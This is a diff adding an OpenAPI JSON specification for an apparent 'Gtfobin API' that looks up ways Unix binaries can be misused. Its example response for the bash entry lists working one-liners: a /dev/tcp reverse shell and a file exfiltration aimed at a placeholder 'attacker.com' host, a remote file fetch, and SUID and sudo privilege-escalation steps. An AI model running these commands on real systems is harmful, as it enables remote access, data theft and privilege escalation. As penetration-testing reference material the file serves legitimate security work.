@@ -1,0 +1,135 @@
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "Gtfobin API",
+    "description": "Get Gtfobin infos Through the API, simple and rapid",
+    "version": "1.0.0",
+    "contact": {
+      "url": "https://brasilapi.com.br"
+    },
+    "license": {
+      "name": "MIT",
+      "url": "https://github.com/R3tr074/gtfobins-api/blob/main/LICENSE"
+    }
+  },
+  "servers": [
+    {
+      "url": "https://gtfobins.tk/api"
+    }
+  ],
+  "paths": {
+    "/search": {
+      "get": {
+        "tags": ["Search"],
+        "summary": "Find your binary by name",
+        "description": "",
+        "parameters": [
+          {
+            "name": "binaryName",
+            "description": "Name of the binary to be searched.\n",
+            "in": "query",
+            "required": true,
+            "schema": { "type": "string" }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Success",
+            "content": {
+              "application/json": {
+                "example": {
+                  "binaryName": "bash",
+                  "url": "https://gtfobins.tk/api/binary/bash/",
+                  "functions": [
+                    "Shell",
+                    "Reverse shell",
+                    "File upload",
+                    "File download",
+                    "File write",
+                    "File read",
+                    "Library load",
+                    "SUID",
+                    "Sudo"
+                  ]
+                }
+              }
+            }
+          },
+          "404": {
+            "description": "Binary not found.",
+            "content": {
+              "application/json": {
+                "example": { "error": "notFound" }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/binary/{binary}": {
+      "get": {
+        "tags": ["Binary"],
+        "summary": "Return all functions to binary",
+        "description": "",
+        "parameters": [
+          {
+            "name": "binary",
+            "description": "Binary name.\n",
+            "in": "path",
+            "required": true,
+            "schema": { "type": "string" }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Success",
+            "content": {
+              "application/json": {
+                "example": [
+                  { "code": "bash", "func": "Shell" },
+                  {
+                    "code": "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &amp;&gt;/dev/tcp/$RHOST/$RPORT &lt;&amp;1'",
+                    "func": "Reverse shell"
+                  },
+                  {
+                    "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(&lt;$LFILE)\" &gt; /dev/tcp/$RHOST/$RPORT'",
+                    "func": "File upload"
+                  },
+                  {
+                    "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1&gt;&amp;3; cat 0&lt;&amp;3; } \\\n    3&lt;&gt;/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] &amp;&amp; break; done; cat; } &gt; $LFILE'",
+                    "func": "File download"
+                  },
+                  {
+                    "code": "export LFILE=file_to_write\nbash -c 'echo DATA &gt; $LFILE'",
+                    "func": "File write"
+                  },
+                  {
+                    "code": "export LFILE=file_to_read\nbash -c 'echo \"$(&lt;$LFILE)\"'",
+                    "func": "File read"
+                  },
+                  {
+                    "code": "bash -c 'enable -f ./lib.so x'",
+                    "func": "Library load"
+                  },
+                  {
+                    "code": "sudo install -m =xs $(which bash) .\n\n./bash -p",
+                    "func": "SUID"
+                  },
+                  { "code": "sudo bash", "func": "Sudo" }
+                ]
+              }
+            }
+          },
+          "404": {
+            "description": "Binary not found",
+            "content": {
+              "application/json": {
+                "example": { "error": "notFound" }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
